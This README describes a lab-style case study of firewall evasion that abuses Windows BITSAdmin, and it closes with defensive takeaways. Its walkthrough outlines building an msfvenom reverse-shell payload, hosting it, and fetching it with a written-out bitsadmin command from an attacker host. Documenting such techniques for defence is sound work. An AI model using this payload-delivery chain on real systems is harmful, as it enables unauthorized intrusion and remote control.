# Firewall Evasion: Bypassing Security Controls with Windows BITSAdmin

This repository contains a case study report on **firewall evasion techniques**.  
The PDF demonstrates how attackers can abuse the **Windows BITSAdmin utility** (a legitimate background transfer tool) to bypass firewalls and deliver malicious payloads.

## 📄 Contents

The PDF includes:

### Introduction
- Role of firewalls and IDS in network defense.  
- How attackers leverage "living off the land" techniques.  
- Abuse of trusted system tools to avoid detection.

### Step-by-Step Walkthrough
1. **Enable Windows Firewall**  
   - Configure Windows Defender Firewall on target machine.  
2. **Generate a Malicious Payload**  
   - Use `msfvenom` to create a Windows reverse shell (`Exploit.exe`).  
3. **Host the Payload**  
   - Place payload on Apache web server (`/var/www/html/share/`).  
4. **Transfer File Using BITSAdmin**  
   - Execute:  
     ```powershell
     bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe C:\Exploit.exe
     ```  
5. **Confirm Placement**  
   - Verify `C:\Exploit.exe` on the target system.  

### Real-World Application
- Attackers often use **Windows-native tools** like BITSAdmin to bypass security controls.  
- Since BITSAdmin is a **Microsoft-signed utility**, firewalls and AV often allow its traffic.  
- Payload delivery appears as normal HTTP traffic, avoiding suspicion.  
- Once executed, the attacker establishes a **reverse shell** for persistence.  

### Defensive Takeaways
✅ Implement **behavior-based monitoring** instead of just signature-based detection.  
✅ Restrict usage of administrative tools like **BITSAdmin** with AppLocker or WDAC.  
✅ Apply **egress filtering** to control outbound connections.  
✅ Monitor unusual or unauthorized **HTTP/S destinations**.  

## ⚠️ Disclaimer
This project is provided **for educational and research purposes only**.  
It illustrates how attackers misuse trusted tools to evade security controls.  
Do not attempt these techniques without explicit authorization.  

## 📂 File
- `Firewall Evasion.pdf`

## 🔗 References
- [BITSAdmin (Microsoft Docs)](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool)  
- [Metasploit msfvenom](https://docs.rapid7.com/metasploit/msfvenom/)  
- [AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/applocker/applocker-overview)  

---

💡 This research demonstrates the importance of **detecting abuse of trusted tools** ("living off the land") in modern cybersecurity.
